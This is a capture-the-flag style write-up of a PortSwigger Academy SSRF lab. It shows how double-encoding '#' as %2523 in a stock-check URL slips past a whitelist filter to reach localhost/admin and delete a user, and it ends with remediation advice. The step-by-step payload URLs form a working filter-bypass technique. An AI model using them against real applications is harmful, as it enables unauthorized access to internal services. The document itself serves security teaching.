# PortSwigger Lab Writeup: SSRF with Whitelist-Based Input Filter

> **Category:** Server-Side Request Forgery (SSRF)  
> **Difficulty:** Expert  
> **Status:** ✅ Solved  
> **Platform:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf)

---

## 🧪 Lab Summary

This lab contains a **stock check feature** that fetches data from an internal system via a user-controlled `stockApi` parameter. The developer has implemented a **whitelist-based input filter** to prevent SSRF. The goal is to bypass the filter and reach `http://localhost/admin` to delete the user `carlos`.

---

## 🎯 Objective

> Access `http://localhost/admin/delete?username=carlos` by bypassing the whitelist filter on the `stockApi` parameter.

---

## 🔍 Vulnerability Background

### What is SSRF?
Server-Side Request Forgery allows an attacker to make the server issue HTTP requests to unintended destinations — typically internal services not accessible from the outside.

### The Defense: Whitelist Filter
The application validates that the `stockApi` URL contains the approved hostname `stock.weliketoshop.net`. A naive string/host check is used rather than proper URL canonicalization.

---

## 🛠 Tools Used

- **Burp Suite** (Intercept + Repeater)
- Web browser
- Manual URL crafting

---

## 📋 Step-by-Step Exploitation

### Step 1 — Intercept the Stock Check Request

Visit any product page, click **"Check stock"**, and intercept the request in Burp Suite. Send it to **Repeater**.

The `stockApi` parameter contains a URL like:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### Step 2 — Confirm SSRF Vector

Change the URL to `http://127.0.0.1/`. The server rejects it but **parses and evaluates** the URL — confirming the SSRF vector exists.

---

### Step 3 — Test Embedded Credentials

URLs support the `user:password@host` format. Try:

```
http://username@stock.weliketoshop.net/
```

✅ **Accepted!** The whitelist validates the host after `@`, so `stock.weliketoshop.net` passes. This shows the URL parser supports embedded credentials.

---

### Step 4 — Attempt Fragment Injection

Try making `localhost` the actual host by treating the whitelisted domain as part of the username, using `#` to terminate the authority:

```
http://localhost#@stock.weliketoshop.net/
```

❌ **Rejected.** The filter detects and blocks the `#`.

---

### Step 5 — Single URL Encode `#` → `%23`

```
http://localhost%23@stock.weliketoshop.net/
```

❌ **Still rejected.** The filter decodes once before checking — `%23` becomes `#` and is caught.

---

### Step 6 — Double URL Encode `#` → `%2523`

```
http://localhost%2523@stock.weliketoshop.net/
```

| Stage | What Is Seen | Outcome |
|---|---|---|
| Filter decodes once | `localhost%23@stock.weliketoshop.net` | Host = `stock.weliketoshop.net` → **Passes whitelist** ✅ |
| HTTP client decodes again | `localhost#@stock.weliketoshop.net` | `#` = fragment → Host = **`localhost`** 🎯 |

The server returns a suspicious **Internal Server Error** — confirming it attempted to connect to `localhost`.

---

### Step 7 — Access Admin Panel

```
http://localhost:80%2523@stock.weliketoshop.net/admin
```

The admin interface is now accessible.

---

### Step 8 — Delete User carlos ✅

```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Send this as the `stockApi` value. The server deletes `carlos` and the lab is solved.

---

## 💡 How the Bypass Works

The trick exploits a **decode depth mismatch** between two components:

1. The **whitelist filter** decodes the URL once → sees `%23` (not `#`) → treats `stock.weliketoshop.net` as the host → **passes**
2. The **HTTP client** decodes again → sees `#` as a fragment separator → treats `localhost` as the host → **connects to internal service**

```
Payload:  http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
           ──────────────────────────────────────────────────────────────────────────
Filter sees: username=localhost:80%23  |  host=stock.weliketoshop.net  → ALLOWED
Client sees: fragment=@stock.weliketoshop.net/...  |  host=localhost:80  → HITS LOCALHOST
```

---

## 🔐 Remediation

| Issue | Fix |
|---|---|
| String-based host matching | Use a proper URL parser to extract the host **after full normalization** |
| Single-pass decoding | Validate the URL against the fully decoded, canonical form |
| No IP resolution check | Resolve hostnames and block RFC-1918 / loopback IPs |
| Filter bypass via fragments | Strip or reject URLs containing `#`, `%23`, or `%2523` before parsing |

**Best practice:** Implement SSRF protection at the network layer (block outbound to 127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16) in addition to application-layer validation.

---

## 🧠 Key Takeaways

1. Whitelist filters are only as strong as the URL parser they use
2. Embedded credentials (`user@host`) shift what the parser considers the authority
3. URL fragments (`#`) cause different parsers to interpret the host differently
4. Double encoding exploits mismatches between validation and execution decode depth
5. Always validate the **canonicalized, fully decoded** URL — never the raw string

---

## 📚 References

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger: Circumventing SSRF Defenses](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses)
- [RFC 3986: URI Generic Syntax](https://datatracker.ietf.org/doc/html/rfc3986)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

*Writeup by [your handle] | PortSwigger Web Security Academy*
